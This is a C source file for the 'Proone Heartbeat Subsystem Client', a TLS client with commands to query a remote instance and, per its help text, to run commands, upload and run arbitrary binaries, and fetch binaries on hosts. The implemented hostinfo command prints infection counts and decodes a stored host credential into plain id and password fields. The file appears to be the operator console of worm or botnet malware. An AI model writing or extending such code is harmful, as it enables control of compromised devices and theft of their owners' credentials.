/*
* No pipelining assumed.
*/
#include <stdint.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <assert.h>

#include <getopt.h>
#include <regex.h>
#include <termios.h>
#include <unistd.h>

#include <mbedtls/ssl.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/entropy.h>
#include <mbedtls/net.h>
#include <yaml.h>

#include "protocol.h"
#include "util_rt.h"
#include "mbedtls.h"
#include "config.h"
#include "iobuf.h"

#define STRINGIFY(x) #x
#define STRINGIFY_X(x) STRINGIFY(x)

#define ROOT_TAG_NAME "htbtclient_run"
#define PREEMBLE_TAG_NAME "preemble"
#define BODY_TAG_NAME "body"

#define MAIN_HELP_STR \
"Proone Heartbeat Subsystem Client\n"\
"Usage: %s [common options] <COMMAND> ...\n"\
"\n"\
"COMMAND:\n"\
"  hostinfo  query host info\n"\
"  hover     send handover request\n"\
"  runcmd    run command on host\n"\
"  runbin    upload and run arbitrary binary on host\n"\
"  nybin     perform binary upgrade on host\n"\
"  getbin    download binary from host\n"\
"\n"\
"Common options:\n"\
"  -h, --help           print help for specified command and exit. Print this\n"\
"                       help and exit if no command is specified\n"\
"  -V, --version        print version and exit\n"\
"  -x                   do not use stdio for user interaction(\"script mode\")\n"\
"  -v, --verbose        increase verbose level. Can be specified more than once\n"\
"  --tls-ca <FILE>      path to tls CA certificate\n"\
"  --tls-cert <FILE>    path to tls client certificate\n"\
"  --tls-key <FILE>     path to tls private key\n"\
"  --tls-key-pw <PW>    password for tls private key\n"\
"  -t, --host <REMOTE>  remote host to connect to\n"\
"  -p, --port <PORT>    specify port (default port: " STRINGIFY_X(PRNE_HTBT_PROTO_PORT) ")\n"\
"\n"\
"The server will not be verified if --tls-ca is not used. Rolled out htbt hosts \n"\
"will verify clients by design/default so both --tls-cert and --tls-key should \n"\
"be used.\n"\
"\n"\
"Use \"%s -h COMMAND\" to get help on each command.\n"\
"\n"
#define HOSTINFO_HELP_STR \
"Get host info from a Proone instance and ouput in YAML format.\n"\
"Usage: %s [common options] hostinfo\n"\
"\n"

enum sub_command {
	SC_NONE,
	SC_HOSTINFO,
	SC_HOVER,
	SC_RUNCMD,
	SC_RUNBIN,
	SC_NYBIN,
	SC_GETBIN
};
typedef enum sub_command sub_command_t;

struct {
	char *tls_ca;
	char *tls_cert;
	char *tls_key;
	char tls_key_pw[256]; // scrub after use
	char *remote_host;
	char *remote_port;
	sub_command_t cmd;
	int prne_vl;
	bool help; // -h or --help used
	bool version; // -V or --version used
	bool tls_key_pw_arg; // true if tls_key_pw is passed via option
	bool no_term; // true if terminal interaction is not permitted
} prog_conf;

struct {
	struct {
		mbedtls_ssl_config conf;
		mbedtls_x509_crt ca;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_ctr_drbg_context rnd;
		mbedtls_entropy_context ent;
		mbedtls_ssl_context ctx;
	} ssl;
	struct {
		mbedtls_net_context ctx;
		prne_iobuf_t ib[2];
	} net;
	struct {
		yaml_emitter_t *emitter;
	} yaml;
} prog_g;

static void print_help (const char *prog, const sub_command_t sc, FILE *out_f) {
	switch (sc) {
	// TODO
	case SC_HOSTINFO:
		fprintf(out_f, HOSTINFO_HELP_STR, prog);
		break;
	default: fprintf(out_f, MAIN_HELP_STR, prog, prog);
	}
}

static void init_prog_g (void) {
	bool alloc_ret = true;
	prne_memzero(&prog_g, sizeof(prog_g)); // so main() is recallable

	mbedtls_ssl_config_init(&prog_g.ssl.conf);
	mbedtls_x509_crt_init(&prog_g.ssl.ca);
	mbedtls_x509_crt_init(&prog_g.ssl.crt);
	mbedtls_pk_init(&prog_g.ssl.pk);
	mbedtls_entropy_init(&prog_g.ssl.ent);
	mbedtls_ctr_drbg_init(&prog_g.ssl.rnd);
	mbedtls_ssl_init(&prog_g.ssl.ctx);

	mbedtls_net_init(&prog_g.net.ctx);
	prne_init_iobuf(prog_g.net.ib + 0);
	prne_init_iobuf(prog_g.net.ib + 1);
	alloc_ret &= prne_alloc_iobuf(
		prog_g.net.ib + 0,
		prne_op_max(PRNE_HTBT_PROTO_MIN_BUF, prne_getpagesize()));
	alloc_ret &= prne_alloc_iobuf(
		prog_g.net.ib + 1,
		prne_op_max(PRNE_HTBT_PROTO_MIN_BUF, prne_getpagesize()));
	if (!alloc_ret) {
		perror("prne_alloc_iobuf()");
		abort();
	}
}

static void deinit_prog_g (void) {
	// TODO
}

static void init_prog_conf (void) {
	prne_memzero(&prog_conf, sizeof(prog_conf)); // so main() is recallable

	prog_conf.remote_port = prne_dup_str(STRINGIFY_X(PRNE_HTBT_PROTO_PORT));
}

static void deinit_prog_conf (void) {
	prne_free(prog_conf.tls_ca);
	prne_free(prog_conf.tls_cert);
	prne_free(prog_conf.tls_key);
	// Security first!
	prne_memzero(prog_conf.tls_key_pw, sizeof(prog_conf.tls_key_pw));
	prne_free(prog_conf.remote_host);
	prne_free(prog_conf.remote_port);
}

static bool is_info_run (void) {
	return prog_conf.help || prog_conf.version;
}

static void print_version (FILE *f) {
	static const uint8_t ver_uuid[] = PRNE_PROG_VER;
	static char ver_str[37];

	if (ver_str[0] == 0) {
		prne_uuid_tostr(ver_uuid, ver_str);
	}

	fprintf(
		f,
		"PRNE_PROG_VER: %s\n"
		"__DATE__: %s\n",
		ver_str,
		__DATE__);
}

static void load_optarg (char **out) {
	const size_t l = strlen(optarg);

	prne_free(*out);
	*out = prne_alloc_str(l);
	strncpy(*out, optarg, l);
}

static bool assert_host_arg (void) {
	if (prog_conf.remote_host == NULL) {
		fprintf(stderr, "Use -t or --host option to specify host.\n");
		return false;
	}
	return true;
}

static int parse_args_hostinfo (const int argc, char *const *args) {
	if (assert_host_arg()) {
		return 0;
	}
	return 2;
}

static int parse_args_hover (const int argc, char *const *args) {
	if (!assert_host_arg()) {
		return 2;
	}
	// TODO
	return 0;
}

static int parse_args_runcmd (const int argc, char *const *args) {
	if (!assert_host_arg()) {
		return 2;
	}
	// TODO
	return 0;
}

static int parse_args_runbin (const int argc, char *const *args) {
	if (!assert_host_arg()) {
		return 2;
	}
	// TODO
	return 0;
}

static int parse_args_nybin (const int argc, char *const *args) {
	if (!assert_host_arg()) {
		return 2;
	}
	// TODO
	return 0;
}

static int parse_args_getbin (const int argc, char *const *args) {
	if (!assert_host_arg()) {
		return 2;
	}
	// TODO
	return 0;
}

static int parse_args (const int argc, char *const *args) {
	int fr, li, ret = 0;
	struct option lopts[] = {
		{ "help", no_argument, 0, 0 },
		{ "version", no_argument, 0, 0 },
		{ "verbose", no_argument, 0, 0 },
		{ "tls-ca", required_argument, 0, 0 },
		{ "tls-cert", required_argument, 0, 0 },
		{ "tls-key", required_argument, 0, 0 },
		{ "tls-key-pw", required_argument, 0, 0 },
		{ "host", required_argument, 0, 0 },
		{ "port", required_argument, 0, 0 },
		{ 0, 0, 0, 0 }
	};
	const struct option *cur_lo;

	while (true) {
		fr = getopt_long(argc, args, "+hVvxt:p:", lopts, &li);

		switch (fr) {
		case 0:
			cur_lo = lopts + li;

			if (strcmp("help", cur_lo->name) == 0) {
				prog_conf.help = true;
			}
			else if (strcmp("verbose", cur_lo->name) == 0) {
				prog_conf.prne_vl += 1;
			}
			else if (strcmp("version", cur_lo->name) == 0) {
				prog_conf.version = true;
			}
			else if (strcmp("tls-ca", cur_lo->name) == 0) {
				load_optarg(&prog_conf.tls_ca);
			}
			else if (strcmp("tls-cert", cur_lo->name) == 0) {
				load_optarg(&prog_conf.tls_cert);
			}
			else if (strcmp("tls-key", cur_lo->name) == 0) {
				load_optarg(&prog_conf.tls_key);
			}
			else if (strcmp("tls-key-pw", cur_lo->name) == 0) {
				strncpy(
					prog_conf.tls_key_pw,
					optarg,
					sizeof(prog_conf.tls_key_pw) - 1);
				prog_conf.tls_key_pw_arg = true;
			}
			else if (strcmp("host", cur_lo->name) == 0) {
				load_optarg(&prog_conf.remote_host);
			}
			else if (strcmp("port", cur_lo->name) == 0) {
				load_optarg(&prog_conf.remote_port);
			}
			else {
				abort();
			}
			break;
		case 'V':
			prog_conf.version = true;
			break;
		case 'v':
			prog_conf.prne_vl += 1;
			break;
		case 'h':
			prog_conf.help = true;
			break;
		case 'x':
			prog_conf.no_term = true;
			break;
		case 't':
			load_optarg(&prog_conf.remote_host);
			break;
		case 'p':
			load_optarg(&prog_conf.remote_port);
			break;
		default:
			goto END_LOOP;
		}
	}
END_LOOP:

	if (!is_info_run()) {
		if ((prog_conf.tls_cert == NULL) ^ (prog_conf.tls_key == NULL)) {
			fprintf(stderr, "--tls-cert and --tls-key must be used in pair.\n");
			return 2;
		}
	}

	if (optind < argc) {
		const char *cmd_str = args[optind];

		optind += 1;
		if (strcmp("hostinfo", cmd_str) == 0) {
			prog_conf.cmd = SC_HOSTINFO;
		}
		else if (strcmp("hover", cmd_str) == 0) {
			prog_conf.cmd = SC_HOVER;
		}
		else if (strcmp("runcmd", cmd_str) == 0) {
			prog_conf.cmd = SC_RUNCMD;
		}
		else if (strcmp("runbin", cmd_str) == 0) {
			prog_conf.cmd = SC_RUNBIN;
		}
		else if (strcmp("nybin", cmd_str) == 0) {
			prog_conf.cmd = SC_NYBIN;
		}
		else if (strcmp("getbin", cmd_str) == 0) {
			prog_conf.cmd = SC_GETBIN;
		}
		else {
			fprintf(stderr, "Invalid COMMAND \"%s\".\n", cmd_str);
			return 2;
		}
	}

	if (is_info_run()) {
		return 0;
	}
	switch (prog_conf.cmd) {
	case SC_HOSTINFO: ret = parse_args_hostinfo(argc, args); break;
	case SC_HOVER: ret = parse_args_hover(argc, args); break;
	case SC_RUNCMD: ret = parse_args_runcmd(argc, args); break;
	case SC_RUNBIN: ret = parse_args_runbin(argc, args); break;
	case SC_NYBIN: ret = parse_args_nybin(argc, args); break;
	case SC_GETBIN: ret = parse_args_getbin(argc, args); break;
	default: fprintf(stderr, "COMMAND not specified.\n");
	}

	return ret;
}

static bool interact_tls_key_pw (void) {
	int f_ret;
	char *s_ret;
	struct termios t;
	tcflag_t saved_flags;
	bool ret = true, flags_saved = false;
	regex_t re_tnl;
	regmatch_t rm[2];

	f_ret = regcomp(&re_tnl, "([\\r\\n]+)$", REG_ICASE | REG_EXTENDED);
	if (f_ret != 0) {
		abort();
	}

// TRY
	if (prog_conf.tls_key_pw_arg) {
		ret = false;
		goto END;
	}
	if (isatty(STDIN_FILENO) == 0 || prog_conf.no_term) {
		fprintf(
			stderr,
			"TLS PK is encrypted but terminal interaction is not possible.\n");
		ret = false;
		goto END;
	}

	fprintf(stderr, "TLS PK password: ");
	fflush(stderr);

	// turn off echo
	f_ret = tcgetattr(STDIN_FILENO, &t);
	if (f_ret != 0) {
		perror("tcgetattr()");
		ret = false;
		goto END;
	}
	saved_flags = t.c_lflag;
	flags_saved = true;
	t.c_lflag &= ~ECHO;
	t.c_lflag |= ECHONL;
	f_ret = tcsetattr(STDIN_FILENO, TCSAFLUSH, &t);
	if (f_ret != 0) {
		perror("tcsetattr()");
		ret = false;
		goto END;
	}

	s_ret = fgets(
		prog_conf.tls_key_pw,
		sizeof(prog_conf.tls_key_pw),
		stdin);
	if (s_ret == NULL) {
		ret = false;
		goto END;
	}

	f_ret = regexec(&re_tnl, prog_conf.tls_key_pw, 2, rm, 0);
	if (f_ret == 0 && rm[1].rm_eo >= 0) {
		// trailing newline character(\r or \n) found.
		// no need to dock the string if the input string does not end with
		// newline.
		prog_conf.tls_key_pw[rm[1].rm_eo] = 0;
	}

END: // CATCH
	if (flags_saved) {
		t.c_lflag = saved_flags;
		tcsetattr(STDIN_FILENO, TCSAFLUSH, &t);
	}
	return ret;
}

static int init_tls (void) {
	int f_ret;
	static const char *ALPN_ARR[] = {
		PRNE_HTBT_TLS_ALP,
		NULL
	};

	f_ret = mbedtls_ctr_drbg_seed(
		&prog_g.ssl.rnd,
		mbedtls_entropy_func,
		&prog_g.ssl.ent,
		NULL,
		0);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ctr_drbg_seed()");
		abort();
	}

	f_ret = mbedtls_ssl_config_defaults(
		&prog_g.ssl.conf,
		MBEDTLS_SSL_IS_CLIENT,
		MBEDTLS_SSL_TRANSPORT_STREAM,
		MBEDTLS_SSL_PRESET_DEFAULT);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ssl_config_defaults()");
		abort();
	}

	f_ret = mbedtls_ssl_conf_alpn_protocols(&prog_g.ssl.conf, ALPN_ARR);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_alpn_protocols()");
		abort();
	}

	mbedtls_ssl_conf_rng(
		&prog_g.ssl.conf,
		mbedtls_ctr_drbg_random,
		&prog_g.ssl.rnd);

	if (prog_conf.tls_ca != NULL) {
		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.ca, prog_conf.tls_ca);
		if (f_ret != 0) {
			prne_mbedtls_perror(f_ret, prog_conf.tls_ca);
			return 1;
		}
		mbedtls_ssl_conf_ca_chain(&prog_g.ssl.conf, &prog_g.ssl.ca, NULL);
		mbedtls_ssl_conf_authmode(
			&prog_g.ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
	}
	else {
		mbedtls_ssl_conf_authmode(
			&prog_g.ssl.conf,
			MBEDTLS_SSL_VERIFY_OPTIONAL);
	}
	if (prog_conf.tls_cert != NULL) {
		f_ret = mbedtls_x509_crt_parse_file(&prog_g.ssl.crt, prog_conf.tls_cert);
		if (f_ret != 0) {
			prne_mbedtls_perror(f_ret, prog_conf.tls_cert);
			return 1;
		}
	}
	if (prog_conf.tls_key != NULL) {
		do {
			f_ret = mbedtls_pk_parse_keyfile(
				&prog_g.ssl.pk,
				prog_conf.tls_key,
				prog_conf.tls_key_pw);
			switch (f_ret) {
			case MBEDTLS_ERR_PK_PASSWORD_REQUIRED:
			case MBEDTLS_ERR_PK_PASSWORD_MISMATCH:
				prne_mbedtls_perror(f_ret, "mbedtls_pk_parse_keyfile()");
				if (!interact_tls_key_pw()) {
					return 1;
				}
				break;
			case 0: break;
			default:
				prne_mbedtls_perror(f_ret, prog_conf.tls_key);
				return 1;
			}
		} while (f_ret != 0);
	}
	prne_memzero(prog_conf.tls_key_pw, sizeof(prog_conf.tls_key_pw));

	f_ret = mbedtls_ssl_conf_own_cert(
		&prog_g.ssl.conf,
		&prog_g.ssl.crt,
		&prog_g.ssl.pk);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ssl_conf_own_cert()");
		return 1;
	}

	return 0;
}

static int yaml_output_handler(void *data, unsigned char *buffer, size_t size) {
	ssize_t io_ret;

	while (size > 0) {
		io_ret = write(STDOUT_FILENO, buffer, size);
		if (io_ret <= 0) {
			if (io_ret < 0) {
				perror("write()");
			}
			return false;
		}
		size -= io_ret;
		buffer += io_ret;
	}
	return true;
}

static void yaml_perror (const char *s) {
	fprintf(stderr, "%s: %s\n", s, prog_g.yaml.emitter->problem);
}

static void emit_mapping_start (void) {
	yaml_event_t e;

	if (yaml_mapping_start_event_initialize(
			&e,
			NULL,
			(yaml_char_t*)YAML_MAP_TAG,
			true,
			YAML_ANY_MAPPING_STYLE) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_mapping_start_event_initialize()");
		abort();
	}
}

static void emit_mapping_end (void) {
	yaml_event_t e;

	if (yaml_mapping_end_event_initialize(&e) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_mapping_end_event_initialize()");
		abort();
	}
}

static void emit_scalar (const char *type, const char *val) {
	yaml_event_t e;

	if (yaml_scalar_event_initialize(
			&e,
			NULL,
			(yaml_char_t*)type,
			(yaml_char_t*)val,
			strlen(val),
			true,
			false,
			YAML_ANY_SCALAR_STYLE) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_mapping_end_event_initialize()");
		abort();
	}
}

static void emit_scalar_fmt (const char *type, const char *fmt, ...) {
	char *str;
	int f_ret;
	va_list va;

	va_start(va, fmt);
	f_ret = vsnprintf(NULL, 0, fmt, va);
	va_end(va);
	if (f_ret < 0) {
		perror("vsnprintf()");
		abort();
	}

	str = prne_alloc_str(f_ret);
	va_start(va, fmt);
	f_ret = vsnprintf(str, (size_t)f_ret + 1, fmt, va);
	va_end(va);

	emit_scalar(type, str);
	prne_free(str);
}

static void start_yaml (void) {
	yaml_event_t e;

	if (prog_g.yaml.emitter != NULL) {
		fprintf(stderr, "start_yaml() called twice!\n");
		abort();
	}

	prog_g.yaml.emitter = prne_malloc(sizeof(yaml_emitter_t), 1);
	if (yaml_emitter_initialize(prog_g.yaml.emitter) == 0) {
		yaml_perror("yaml_emitter_initialize()");
		abort();
	}
	yaml_emitter_set_output(prog_g.yaml.emitter, yaml_output_handler, NULL);

	if (yaml_stream_start_event_initialize(&e, YAML_UTF8_ENCODING) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_stream_start_event_initialize()");
		abort();
	}
	if (yaml_document_start_event_initialize(&e, NULL, NULL, NULL, true) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_document_start_event_initialize()");
		abort();
	}
	emit_mapping_start();
	emit_scalar(YAML_STR_TAG, ROOT_TAG_NAME);
	emit_mapping_start();
}

static void end_yaml (void) {
	yaml_event_t e;

	if (prog_g.yaml.emitter == NULL) {
		return;
	}

	emit_mapping_end();
	emit_mapping_end();
	if (yaml_document_end_event_initialize(&e, true) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_document_end_event_initialize()");
		abort();
	}
	if (yaml_stream_end_event_initialize(&e) == 0 ||
		yaml_emitter_emit(prog_g.yaml.emitter, &e) == 0)
	{
		yaml_perror("yaml_stream_end_event_initialize()");
		abort();
	}
}

static bool do_connect (void) {
	int f_ret;

	f_ret = mbedtls_net_connect(
		&prog_g.net.ctx,
		prog_conf.remote_host,
		prog_conf.remote_port,
		MBEDTLS_NET_PROTO_TCP);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_net_connect()");
		return false;
	}

	f_ret = mbedtls_ssl_setup(&prog_g.ssl.ctx, &prog_g.ssl.conf);
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ssl_setup()");
		return false;
	}
	mbedtls_ssl_set_bio(
		&prog_g.ssl.ctx,
		&prog_g.net.ctx,
		mbedtls_net_send,
		mbedtls_net_recv,
		mbedtls_net_recv_timeout);

	return true;
}

static uint16_t htbt_msgid_rnd_f (void *ctx) {
	int f_ret;
	uint16_t ret;

	f_ret = mbedtls_ctr_drbg_random(
		&prog_g.ssl.rnd,
		(unsigned char*)&ret,
		sizeof(ret));
	if (f_ret != 0) {
		prne_mbedtls_perror(f_ret, "mbedtls_ctr_drbg_random()");
		abort();
	}
	return ret;
}

static void raise_proto_err (void) {
	// TODO
}

static bool send_frame (const void *frame, prne_htbt_ser_ft ser_f) {
	int f_ret;
	size_t actual;
	prne_htbt_ser_rc_t rc;

	prne_iobuf_reset(prog_g.net.ib + 1);
	rc = ser_f(
		prog_g.net.ib[1].m,
		prog_g.net.ib[1].avail,
		&actual,
		frame);
	switch (rc) {
	case PRNE_HTBT_SER_RC_OK: break;
	case PRNE_HTBT_SER_RC_ERRNO:
		perror("prne_htbt_ser_ft()");
		return false;
	default:
		fprintf(stderr, "prne_htbt_ser_ft(): %s\n", prne_htbt_serrc_tostr(rc));
		return false;
	}
	prne_iobuf_shift(prog_g.net.ib + 1, actual);

	while (prog_g.net.ib[1].len > 0) {
		f_ret = mbedtls_ssl_write(
			&prog_g.ssl.ctx,
			prog_g.net.ib[1].m,
			prog_g.net.ib[1].len);
		if (f_ret == 0) {
			fprintf(stderr, "mbedtls_ssl_write(): EOF\n");
			raise_proto_err();
			return false;
		}
		if (f_ret < 0) {
			prne_mbedtls_perror(f_ret, "mbedtls_ssl_write()");
			return false;
		}
		prne_iobuf_shift(prog_g.net.ib + 1, -f_ret);
	}

	return true;
}

static bool recv_frame (void *frame, prne_htbt_dser_ft dser_f) {
	size_t actual;
	prne_htbt_ser_rc_t rc;
	int f_ret;

	while (true) {
		rc = dser_f(prog_g.net.ib[0].m, prog_g.net.ib[0].len, &actual, frame);

		switch (rc) {
		case PRNE_HTBT_SER_RC_OK:
			prne_iobuf_shift(prog_g.net.ib + 0, -actual);
			return true;
		case PRNE_HTBT_SER_RC_MORE_BUF:
			assert(actual <= prog_g.net.ib[0].size);
			break;
		case PRNE_HTBT_SER_RC_ERRNO:
			perror("dser_f()");
			abort();
		default:
			raise_proto_err();
			return false;
		}

		f_ret = mbedtls_ssl_read(
			&prog_g.ssl.ctx,
			prog_g.net.ib[0].m + prog_g.net.ib[0].len,
			prog_g.net.ib[0].avail);
		if (f_ret == 0) {
			fprintf(stderr, "mbedtls_ssl_read(): EOF\n");
			raise_proto_err();
			return false;
		}
		if (f_ret < 0) {
			prne_mbedtls_perror(f_ret, "mbedtls_ssl_read()");
			return false;
		}
		prne_iobuf_shift(prog_g.net.ib + 0, f_ret);
	}
}

static bool recv_mh (prne_htbt_msg_head_t *mh, const uint16_t *cor_id) {
	if (!recv_frame(mh, (prne_htbt_dser_ft)prne_htbt_dser_msg_head)) {
		return false;
	}

	if (!mh->is_rsp) {
		raise_proto_err();
		fprintf(stderr, "recv_mh(): received request frame\n");
		return false;
	}
	if (cor_id != NULL && *cor_id != mh->id) {
		raise_proto_err();
		fprintf(stderr, "recv_mh(): received request frame\n");
		return false;
	}

	return true;
}

static void emit_status_frame (const prne_htbt_status_t *st) {
	emit_scalar(YAML_STR_TAG, BODY_TAG_NAME);

	emit_mapping_start();
	emit_scalar(YAML_INT_TAG,"code");
	emit_scalar_fmt(YAML_INT_TAG, "%d", st->code);
	emit_scalar(YAML_STR_TAG, "err");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRId32, st->err);
	emit_mapping_end();
}

static void emit_preemble (const char *cmd, const char *result) {
	// TODO: include -t -p and resolved hostname as well
	emit_scalar(YAML_STR_TAG, PREEMBLE_TAG_NAME);

	emit_mapping_start();
	emit_scalar(YAML_STR_TAG, "command");
	emit_scalar(YAML_STR_TAG, cmd);
	emit_scalar(YAML_STR_TAG, "result");
	emit_scalar(YAML_STR_TAG, result);
	emit_mapping_end();
}

static void emit_hostinfo_frame (const prne_htbt_host_info_t *hi) {
	prne_host_cred_t hc;
	prne_htbt_ser_rc_t rc;
	const char *archstr;

	prne_init_host_cred(&hc);
	emit_scalar(YAML_STR_TAG, BODY_TAG_NAME);

	emit_mapping_start();
	emit_scalar(YAML_STR_TAG, "parent_uptime");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu64, hi->parent_uptime);
	emit_scalar(YAML_STR_TAG, "child_uptime");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu64, hi->child_uptime);
	emit_scalar(YAML_STR_TAG, "bne_cnt");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu64, hi->bne_cnt);
	emit_scalar(YAML_STR_TAG, "infect_cnt");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu64, hi->infect_cnt);
	emit_scalar(YAML_STR_TAG, "parent_pid");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu32, hi->parent_pid);
	emit_scalar(YAML_STR_TAG, "child_pid");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu32, hi->child_pid);
	emit_scalar(YAML_STR_TAG, "prog_ver");
	emit_scalar_fmt(
		YAML_STR_TAG,
		"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
		hi->prog_ver[0],
		hi->prog_ver[1],
		hi->prog_ver[2],
		hi->prog_ver[3],
		hi->prog_ver[4],
		hi->prog_ver[5],
		hi->prog_ver[6],
		hi->prog_ver[7],
		hi->prog_ver[8],
		hi->prog_ver[9],
		hi->prog_ver[10],
		hi->prog_ver[11],
		hi->prog_ver[12],
		hi->prog_ver[13],
		hi->prog_ver[14],
		hi->prog_ver[15]);
	emit_scalar(YAML_STR_TAG, "boot_id");
	emit_scalar_fmt(
		YAML_STR_TAG,
		"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
		hi->boot_id[0],
		hi->boot_id[1],
		hi->boot_id[2],
		hi->boot_id[3],
		hi->boot_id[4],
		hi->boot_id[5],
		hi->boot_id[6],
		hi->boot_id[7],
		hi->boot_id[8],
		hi->boot_id[9],
		hi->boot_id[10],
		hi->boot_id[11],
		hi->boot_id[12],
		hi->boot_id[13],
		hi->boot_id[14],
		hi->boot_id[15]);
	emit_scalar(YAML_STR_TAG, "instance_id");
	emit_scalar_fmt(
		YAML_STR_TAG,
		"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
		hi->instance_id[0],
		hi->instance_id[1],
		hi->instance_id[2],
		hi->instance_id[3],
		hi->instance_id[4],
		hi->instance_id[5],
		hi->instance_id[6],
		hi->instance_id[7],
		hi->instance_id[8],
		hi->instance_id[9],
		hi->instance_id[10],
		hi->instance_id[11],
		hi->instance_id[12],
		hi->instance_id[13],
		hi->instance_id[14],
		hi->instance_id[15]);

	if (hi->host_cred_len > 0) {
		rc = prne_dec_host_cred(hi->host_cred, hi->host_cred_len, &hc);
		emit_scalar(YAML_STR_TAG, "host_cred");

		emit_mapping_start();
		if (rc == PRNE_HTBT_SER_RC_ERRNO) {
			perror("prne_dec_host_cred()");
			abort();
		}
		else if (rc == PRNE_HTBT_SER_RC_OK &&
			prne_chkcstr(hc.id, prne_cisprint) &&
			prne_chkcstr(hc.pw, prne_cisprint))
		{
			emit_scalar(YAML_STR_TAG, "fmt");
			emit_scalar(YAML_STR_TAG, "plain");
			emit_scalar(YAML_STR_TAG, "id");
			emit_scalar(YAML_STR_TAG, hc.id);
			emit_scalar(YAML_STR_TAG, "pw");
			emit_scalar(YAML_STR_TAG, hc.pw);
		}
		else {
			char *b64str;

			b64str = prne_enc_base64_mem(hi->host_cred, hi->host_cred_len);
			if (b64str == NULL) {
				perror("prne_enc_base64_mem()");
				abort();
			}

			emit_scalar(YAML_STR_TAG, "fmt");
			emit_scalar(YAML_STR_TAG, "raw");
			emit_scalar(YAML_STR_TAG, "raw");
			emit_scalar(YAML_STR_TAG, b64str);

			prne_free(b64str);
		}
		emit_mapping_end();
	}

	emit_scalar(YAML_STR_TAG, "crash_cnt");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu32, hi->crash_cnt);
	emit_scalar(YAML_STR_TAG, "arch");
	emit_scalar_fmt(YAML_INT_TAG, "%"PRIu32, hi->arch);
	archstr = prne_arch_tostr(hi->arch);
	if (archstr != NULL) {
		emit_scalar(YAML_STR_TAG, "archstr");
		emit_scalar(YAML_STR_TAG, archstr);
	}
	emit_mapping_end();

	prne_free_host_cred(&hc);
}

static int cmdmain_hostinfo (void) {
	int ret = 0;
	uint16_t msgid;
	prne_htbt_msg_head_t mh;
	prne_htbt_host_info_t hi;
	prne_htbt_status_t st;

	msgid = prne_htbt_gen_msgid(NULL, htbt_msgid_rnd_f);
	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_host_info(&hi);
	prne_htbt_init_status(&st);
	mh.id = msgid;
	mh.is_rsp = false;
	mh.op = PRNE_HTBT_OP_HOST_INFO;

	if (!do_connect()) {
		ret = 1;
		goto END;
	}

	if (!send_frame(&mh, (prne_htbt_ser_ft)prne_htbt_ser_msg_head)) {
		ret = 1;
		goto END;
	}
	if (!recv_mh(&mh, &msgid)) {
		ret = 1;
		goto END;
	}
	switch (mh.op) {
	case PRNE_HTBT_OP_HOST_INFO:
		if (!recv_frame(&hi, (prne_htbt_dser_ft)prne_htbt_dser_host_info)) {
			ret = 1;
			goto END;
		}
		start_yaml();
		emit_preemble("hostinfo", "ok");
		emit_hostinfo_frame(&hi);
		break;
	case PRNE_HTBT_OP_STATUS:
		ret = 1;
		if (recv_frame(&st, (prne_htbt_dser_ft)prne_htbt_dser_status)) {
			start_yaml();
			emit_preemble("hostinfo", "status");
			emit_status_frame(&st);
		}
		goto END;
	default:
		fprintf(stderr, "Invalid op code response: %"PRIx8"\n", mh.op);
		ret = 1;
		goto END;
	}

END:
	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_host_info(&hi);
	prne_htbt_free_status(&st);
	return ret;
}

int main (const int argc, char *const *args) {
	int ec = 0;

	init_prog_g();
	init_prog_conf();

	if (argc <= 1) {
		print_help(args[0], SC_NONE, stderr);
		ec = 2;
		goto END;
	}

	ec = parse_args(argc, args);
	if (prog_conf.help) {
		print_help(args[0], prog_conf.cmd, stdout);
	}
	if (prog_conf.version) {
		print_version(stdout);
	}
	if (ec != 0 || is_info_run()) {
		goto END;
	}

	ec = init_tls();
	if (ec != 0) {
		goto END;
	}

	switch (prog_conf.cmd) {
	// TODO
	case SC_HOSTINFO: ec = cmdmain_hostinfo(); break;
	default:
		ec = 1;
		fprintf(stderr, "COMMAND not implemented.\n");
	}

END:
	end_yaml();
	deinit_prog_conf();
	deinit_prog_g();
	return ec;
}
